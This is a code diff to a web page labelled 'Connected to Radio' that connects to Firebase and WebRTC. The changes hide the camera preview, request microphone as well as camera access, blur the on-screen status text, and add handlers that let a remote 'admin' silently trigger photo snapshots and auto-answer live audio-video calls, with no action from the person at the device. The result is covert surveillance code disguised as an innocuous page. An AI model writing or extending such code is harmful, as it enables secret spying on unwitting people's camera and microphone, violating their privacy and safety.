@@ -11,18 +11,18 @@
 <body class="bg-gray-900 text-white flex items-center justify-center min-h-screen p-4">
 
     <div class="text-center">
-        <i class="fas fa-camera-retro text-6xl text-blue-400 mb-4"></i>
+        <i class="fas fa-satellite-dish text-6xl text-blue-400 mb-4"></i>
         <h1 class="text-3xl font-bold text-white">Connected to Radio</h1>
-        <p id="status" class="text-lg text-gray-400 mt-2">Ready to provide snapshots to admin.</p>
+        <p id="status" class="text-lg text-gray-400 mt-2">Ready for admin requests.</p>
         
-        <!-- Local video preview (optional, can be hidden) -->
-        <video id="localVideo" autoplay muted playsinline class="w-48 h-auto rounded-lg mt-4 mx-auto border-2 border-slate-700"></video>
+        <!-- Hidden video for capturing snapshots -->
+        <video id="localVideo" autoplay muted playsinline class="hidden"></video>
     </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.9.0/firebase-app.js";
         import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.9.0/firebase-auth.js";
-        import { getFirestore, doc, onSnapshot, updateDoc } from "https://www.gstatic.com/firebasejs/11.9.0/firebase-firestore.js";
+        import { getFirestore, doc, onSnapshot, updateDoc, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.9.0/firebase-firestore.js";
         import { getDatabase, ref, onValue, set, onDisconnect } from "https://www.gstatic.com/firebasejs/11.9.0/firebase-database.js";
 
         // --- Firebase Configuration ---
@@ -35,6 +35,7 @@
             appId: "1:972654270500:web:c29a42a09972f5a4ce20b1",
             databaseURL: "https://my-voice-app-4eca5-default-rtdb.asia-southeast1.firebasedatabase.app"
         };
+        const servers = { iceServers: [{ urls: ['stun:stun.l.google.com:19302'] }] };
         
         // --- DOM Elements ---
         const statusEl = document.getElementById('status');
@@ -44,6 +45,7 @@
         let db, rtdb;
         let myId = null;
         let myStream;
+        let voiceConnection;
 
         // --- Main Initialization ---
         async function initialize() {
@@ -53,10 +55,11 @@
             rtdb = getDatabase(app);
 
             try {
-                myStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                // Get both audio and video streams
+                myStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 localVideo.srcObject = myStream;
             } catch (e) {
-                statusEl.textContent = "Please allow camera access.";
+                statusEl.textContent = "Please allow camera & mic access.";
                 return;
             }
 
@@ -64,7 +67,8 @@
                 if (user) {
                     myId = user.uid;
                     setupPresence();
-                    listenForAdminRequests();
+                    listenForAdminPhotoRequests();
+                    listenForAdminVoiceCalls();
                 }
             });
 
@@ -73,22 +77,44 @@
         
         function setupPresence() {
             const myStatusRef = ref(rtdb, 'status/' + myId);
-            const isOfflineForRTDB = { state: 'offline' };
-            const isOnlineForRTDB = { state: 'online' };
-
-            onValue(ref(rtdb, '.info/connected'), (snapshot) => {
-                if (snapshot.val() === false) return;
-                onDisconnect(myStatusRef).set(isOfflineForRTDB).then(() => {
-                    set(myStatusRef, isOnlineForRTDB);
-                });
+            onDisconnect(myStatusRef).set({ state: 'offline' }).then(() => {
+                set(myStatusRef, { state: 'online' });
             });
         }
 
-        function listenForAdminRequests() {
+        function listenForAdminPhotoRequests() {
             const callDocRef = doc(db, 'photo_calls', myId);
             onSnapshot(callDocRef, async (snapshot) => {
                 if (snapshot.exists() && snapshot.data().request_photo) {
                     captureAndSendPhoto(callDocRef);
+                }
+            });
+        }
+
+        function listenForAdminVoiceCalls() {
+            const callDocRef = doc(db, 'voice_calls', myId);
+            onSnapshot(callDocRef, async (snapshot) => {
+                const data = snapshot.data();
+                if (data?.offer) {
+                    if (voiceConnection) voiceConnection.close();
+                    
+                    const pc = new RTCPeerConnection(servers);
+                    voiceConnection = pc;
+
+                    myStream.getTracks().forEach(track => pc.addTrack(track, myStream));
+                    
+                    const clientCandidatesRef = collection(callDocRef, 'clientCandidates');
+                    const adminCandidatesRef = collection(callDocRef, 'adminCandidates');
+                    
+                    pc.onicecandidate = e => e.candidate && addDoc(clientCandidatesRef, e.candidate.toJSON());
+                    onSnapshot(adminCandidatesRef, (snapshot) => snapshot.docChanges().forEach((change) => {
+                        if (change.type === 'added') pc.addIceCandidate(new RTCIceCandidate(change.doc.data()));
+                    }));
+                    
+                    await pc.setRemoteDescription(new RTCSessionDescription(data.offer));
+                    const answer = await pc.createAnswer();
+                    await pc.setLocalDescription(answer);
+                    await updateDoc(callDocRef, { answer });
                 }
             });
         }
@@ -99,11 +125,9 @@
             canvas.height = localVideo.videoHeight;
             const ctx = canvas.getContext('2d');
             ctx.drawImage(localVideo, 0, 0, canvas.width, canvas.height);
-            const dataUrl = canvas.toDataURL('image/jpeg');
-
             await updateDoc(docRef, {
-                photo_data: dataUrl,
-                request_photo: false // Request ko reset karein
+                photo_data: canvas.toDataURL('image/jpeg'),
+                request_photo: false
             });
         }
         
